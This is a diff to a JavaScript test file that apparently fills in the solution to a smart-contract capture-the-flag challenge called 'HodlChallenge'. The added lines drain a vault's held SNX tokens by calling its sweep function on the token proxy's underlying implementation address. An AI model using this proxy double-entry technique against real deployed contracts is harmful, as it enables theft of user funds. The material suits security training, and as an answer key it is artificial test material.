@@ -45,7 +45,10 @@ describe('HodlChallenge', async function () {
     await snx.connect(player).approve(vault.address, amotToDeposit)
     await vault.connect(player).hold(amotToDeposit)
 
-    // TODO: Your solution below
+    // SNX is a proxy contract, we can sweep the target implementation
+    // to remove the tokens from the vault
+    const target = await snx.target()
+    await vault.sweep(target);
 
     // check
     expect(await vault.holdMethodIsCalled()).to.be.true
